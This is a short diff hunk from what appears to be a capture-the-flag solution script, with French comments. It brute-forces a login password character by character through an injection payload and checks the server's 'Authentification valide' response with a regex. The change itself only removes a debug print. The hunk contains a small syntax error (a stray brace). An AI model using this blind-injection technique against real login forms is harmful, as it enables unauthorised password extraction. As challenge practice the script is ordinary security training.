@@ -15,7 +15,6 @@ while(trouve == 0):
     req = {'password':injection, 'nonce':''} # Ajouter le nonce permettant d'éviter le rejeu si nécessaire
     resultat = requests.post('', cookies=cookies},data=req).content # Requête comprenant l'injection
     regex = re.search("<center>Authentification valide. Le mot de passe est le flag.</center>",resultat) # Regex permettant de voir si le caractère essayé est le bon en testant le message de retour
-    print(login)
     if regex is not None:
         if (l > 1):
 	    final_pass += chr(alphabet[i])
